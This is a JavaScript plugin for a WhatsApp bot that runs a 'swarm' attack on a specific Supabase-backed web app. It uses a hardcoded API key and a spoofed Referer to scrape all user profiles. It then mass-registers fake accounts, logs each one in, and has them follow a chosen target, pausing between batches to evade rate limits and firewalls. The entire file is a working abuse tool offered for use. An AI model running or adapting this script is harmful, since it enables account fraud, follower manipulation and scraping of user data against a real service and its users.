import axios from 'axios';
import crypto from 'crypto';

const CONFIG = {
    API_URL: "https://vnuturzxvxkjbkawgnpf.supabase.co",
    API_KEY: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZudXR1cnp4dnhramJrYXdnbnBmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjkwMTcxMzQsImV4cCI6MjA4NDU5MzEzNH0.v1pLqnN0VuYAeCSqKU3KEbGxam-hIc0md31WPhEiImQ",
    REFERER: "https://denki-toolweb.lovable.app/"
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const handler = async (m, { conn, text, usedPrefix, command }) => {
    let [target, count] = text.split('|').map(v => v.trim());
    let totalGoal = parseInt(count);

    if (!target || isNaN(totalGoal)) {
        return m.reply(`*Usage:* ${usedPrefix + command} target_user | 1000000`);
    }

    await m.react('💀');
    const { key } = await conn.sendMessage(m.chat, { text: `⚠️ *SWARM INITIALIZED*\nTarget: ${target}\nGoal: ${totalGoal.toLocaleString()} Bots\n_Processing in 7s intervals to bypass firewall..._` }, { quoted: m });

    try {
        // 1. Resolve Target UUID
        const profileResp = await axios.get(`${CONFIG.API_URL}/rest/v1/profiles?select=*`, { 
            headers: { "apikey": CONFIG.API_KEY, "Referer": CONFIG.REFERER } 
        });
        const targetUser = profileResp.data.find(u => u.username?.toLowerCase() === target.toLowerCase());
        if (!targetUser) throw new Error("Target node not found.");
        const targetId = targetUser.user_id;

        let successCount = 0;

        for (let i = 0; i < totalGoal; i++) {
            try {
                // Identity Generation
                const randomHex = crypto.randomBytes(4).toString('hex');
                const botEmail = `Omegabot_${randomHex}@omega.tech`;
                const botPass = `Omega#${randomHex}2026`;
                const botName = `Omegabot_${randomHex}`;

                // STEP A: CREATE ACCOUNT
                const signup = await axios.post(`${CONFIG.API_URL}/auth/v1/signup`, {
                    email: botEmail, password: botPass, data: { username: botName }
                }, { headers: { "apikey": CONFIG.API_KEY, "Content-Type": "application/json" } });

                const botId = signup.data.id || signup.data.user?.id;

                // STEP B: LOGIN & FOLLOW
                const login = await axios.post(`${CONFIG.API_URL}/auth/v1/token?grant_type=password`, {
                    email: botEmail, password: botPass
                }, { headers: { "apikey": CONFIG.API_KEY } });

                const token = login.data.access_token;

                await axios.post(`${CONFIG.API_URL}/rest/v1/follows`, 
                    { follower_id: botId, following_id: targetId }, 
                    { headers: { "apikey": CONFIG.API_KEY, "Authorization": `Bearer ${token}` } }
                );

                successCount++;

                // Update Status every 10 bots
                if (successCount % 10 === 0) {
                    await conn.sendMessage(m.chat, { 
                        text: `🚀 *SWARM PROGRESS*\nTarget: ${target}\nBots Active: ${successCount}/${totalGoal}\n_Waiting 7s for next batch..._`, 
                        edit: key 
                    });
                    await sleep(7000); // 7 second rest as requested
                }

            } catch (err) {
                console.log(`Bot ${i} Error: ${err.message}`);
                // If we get a 429, wait longer
                if (err.response?.status === 429) await sleep(30000);
            }
        }

        await conn.sendMessage(m.chat, { text: `🏆 *SWARM COMPLETE*\nTotal Bots Deployed: ${successCount}\nTarget: ${target}\n_Network integrity compromised._`, edit: key });

    } catch (e) {
        await conn.sendMessage(m.chat, { text: `❌ *CRITICAL FAILURE:* ${e.message}`, edit: key });
    }
};

handler.help = ['swarm'];
handler.tags = ['owner'];
handler.command = /^(swarm|millionbot)$/i;

export default handler;